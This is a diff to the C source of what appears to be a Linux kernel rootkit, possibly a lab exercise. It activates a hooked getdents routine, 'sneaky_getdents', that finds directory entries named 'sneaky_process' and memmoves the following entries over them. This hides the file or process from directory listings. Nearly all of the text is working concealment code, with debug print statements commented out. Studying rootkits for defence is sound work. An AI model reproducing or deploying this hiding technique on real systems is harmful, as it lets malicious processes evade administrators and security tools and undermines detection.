@@ -89,33 +89,32 @@ asmlinkage int sneaky_getdents (unsigned int fd,
     struct linux_dirent * ptr;
     ptr = (struct linux_dirent *) ((void*)dirp + offset);
 
-    printk(">>");
-    printk(ptr->d_name);
-    /* if (strcmp(dirp[i].d_name, "sneaky_process") == 0) { */
-    /*   // ha! ISO C90 forbids mixed var declare & code !?? */
-    /*   void* unexamined_start; */
-    /*   int unexamined_size; */
+    /* printk(">>"); */
+    /* printk(ptr->d_name); */
 
-    /*   printk("WWWWW Found!"); */
+    if (strcmp(ptr->d_name, "sneaky_process") == 0) {
+      // ha! ISO C90 forbids mixed var declare & code !??
+      void* unexamined_start;
+      int unexamined_size;
+
+      printk("WWWWW Found!");
       
-    /*   skipped_num += 1; */
+      skipped_size += ptr->d_reclen;
 
-    /*   unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen; */
-    /*   unexamined_size = dirp[dirent_num - skipped_num].d_reclen + */
-    /* 	(int)((void*)(&dirp[dirent_num - skipped_num]) - unexamined_start); */
+      unexamined_start = (void*)(ptr) + ptr->d_reclen;
+      unexamined_size = dirent_size - skipped_size - examined_size;
 
-    /*   memmove((void*)(&dirp[i]), */
-    /* 	      unexamined_start, */
-    /* 	      unexamined_size); */
-    /*   // i stays the same here, do not update! */
+      memmove(ptr,
+    	      unexamined_start,
+    	      unexamined_size);
+      // offset stays the same here, do not update!
       
-    /* } else { */
-    /*   examined_num += 1; */
+    } else {
+      examined_size += ptr->d_reclen;
     
-    /*   // update i here */
-    /*   i++; */
-    /* } */
-    offset += ptr->d_reclen;
+      // update offset here
+      offset += ptr->d_reclen;
+    }
   }
   
   return dirent_size - skipped_size;
